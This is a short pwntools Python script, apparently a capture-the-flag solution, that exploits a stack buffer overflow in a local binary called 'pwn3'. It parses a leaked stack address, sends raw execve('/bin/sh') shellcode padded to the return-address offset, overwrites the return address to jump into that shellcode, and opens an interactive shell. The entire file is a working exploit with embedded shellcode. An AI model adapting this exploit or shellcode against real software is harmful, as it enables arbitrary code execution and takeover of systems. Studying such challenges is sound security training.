from pwn import *

target = process('./pwn3')

# Print out the text, up to the address of the start of our input
print(target.recvuntil("journey "))

# Scan in the rest of the line
leak = target.recvline()

# Strip away the characters not part of our address
shellcodeAdr = int(leak.strip(b"!\n"), 16)

# Make the payload
payload = b""
# Our shellcode from: http://shell-storm.org/shellcode/files/shellcode-827.php
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
# Pad the rest of the space to the return address with zeroes
payload += b"0"*(0x12e - len(payload))
# Overwrite the return address with te leaked address which points to the start of our shellcode
payload += p32(shellcodeAdr)

# Send the payload
target.sendline(payload)

# Drop to an interactive shell to use our newly popped shell
target.interactive()